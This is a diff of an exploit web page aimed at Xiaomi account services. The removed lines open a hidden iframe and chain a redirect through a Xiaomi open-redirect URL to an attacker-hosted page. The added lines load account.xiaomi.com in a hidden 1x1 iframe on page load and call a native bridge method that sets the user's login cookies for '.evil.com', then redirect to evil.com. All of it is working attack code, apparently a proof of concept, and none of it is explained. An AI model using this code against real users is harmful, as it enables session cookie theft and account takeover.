@@ -1,22 +1,22 @@
-<html>
-<head>
-<title>Hack</title>
-</head>
-<body>
+<iframe id="target" width="1" height="1"></iframe>
 <script>
-function getinn(){
-var html = '<div>hello hack!</div><script>document.write("waiting...<BR>");setTimeout("document.getElementById(\'obj\').src=\'https://h5.tv.mi.com/store/jumptourl/redirect?follow=https://mitiandashuaibi.github.io%5Cacccs.mi.com/mcc.html\';",1500);<\/script><iframe width="1" height="1" src="" id="obj"></iframe>';
-document.write(html);
-
-}
-function goto1(){
-document.location.href="https://lite.a.market.xiaomi.com";
-
-}
-setTimeout("goto1()",10);
-
-setTimeout("getinn()",11);
-</script>
-<div id="dyscript"></div>
-</body>
-</html>
+function attack() {
+ var iframe = document.getElementById('target');
+ iframe.src = "https://account.xiaomi.com/blank.html";
+     iframe.onload = function() {
+    var iframeWindow = iframe.contentWindow;
+    var params = {
+       "callbackId": "cookieCallback",
+      "serviceIdCookieDomains": [
+      {
+      "serviceId": "mishop",
+       "cookieDomain": ".evil.com"
+      }
+      ]
+      };
+     iframeWindow.PASSPORT_JSB_METHOD_INVOKER.invokeMethod("requestAndSetLoginCookies",JSON.stringify(params));
+     iframe.src = "https://evil.com/redirect.html";
+     };
+   }
+   window.onload = attack;
+   </script>
